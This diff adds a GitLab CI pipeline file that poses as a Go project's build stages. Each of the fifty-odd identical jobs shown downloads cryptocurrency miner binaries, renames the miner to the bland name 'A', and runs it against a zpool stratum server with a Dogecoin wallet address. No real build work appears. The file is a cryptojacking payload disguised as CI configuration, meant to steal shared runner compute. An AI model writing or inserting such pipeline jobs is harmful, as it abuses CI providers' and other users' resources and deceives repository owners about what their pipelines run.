@@ -1,0 +1,1010 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_001:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_002:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_003:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_004:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_005:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_006:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_007:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_008:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_009:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_010:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_011:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_012:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_013:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_014:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_015:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_016:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_017:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_018:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_019:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_020:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_021:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_022:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_023:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_024:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_025:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_026:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_027:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_028:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_029:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_030:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_031:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_032:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_033:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_034:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_035:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_036:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_037:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_038:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_039:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_040:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_041:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_042:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_043:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_044:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_045:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_046:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_047:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_048:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_049:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_050:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_051:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_052:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_053:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_054:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_055:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
